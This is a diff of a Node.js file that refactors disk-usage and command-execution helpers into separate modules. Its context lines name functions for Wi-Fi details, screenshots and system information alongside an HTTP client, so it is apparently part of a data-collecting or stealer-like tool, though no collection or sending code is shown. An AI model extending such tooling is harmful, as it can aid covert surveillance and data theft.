@@ -1,21 +1,15 @@
-const child_process = require("child_process");
-const diskusage     = require('diskusage');
-const axios         = require('axios');
-const util          = require("util");
-const path          = require('path');
-const fs            = require('fs');
+const {
+    checkDiskUsage
+} = require('./disk.js');
 
-const exec = util.promisify(child_process.exec);
+const {
+    execCommand
+} = require('./processes.js');
 
-const execCommand = async (cmd) => {
-    try {
-        const { stdout } = await exec(cmd);
-        return stdout.trim();
-    } catch (error) {
-        console.error(`Error executing command "${cmd}": ${error.message}`);
-        return "";
-    }
-};
+const child_process = require('child_process');
+const axios = require('axios');
+const path  = require('path');
+const fs    = require('fs');
 
 const getDisk = async () => {
     try {
@@ -92,7 +86,7 @@ const getWifi = () => {
     }
 }
 
-function randString(length) {
+const randString = (length) => {
     const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let str = '';
     for (let i = 0; i < length; i++) {
@@ -118,9 +112,9 @@ const getScreenShots = async () => {
 
 const getDisksInfo = async () => {
     try {
-        const rootPath = process.platform === 'win32' ? 'C:\\' : '/';
+        const rootPath = process.platform === 'win32' ? 'C:' : '/';
 
-        const { available, total, free } = await diskusage.check(rootPath);
+        const { available, total, free } = await checkDiskUsage(rootPath);
 
         const freeGB = (free / (1024 ** 3)).toFixed(2) + 'GB';
         const totalGB = (total / (1024 ** 3)).toFixed(2) + 'GB';
@@ -146,7 +140,7 @@ const getDisksInfo = async () => {
     }
 }
 
-async function systemInfo() {
+const systemInfo = async () => {
     try {
         const [
             WINDOWS_VERSION,
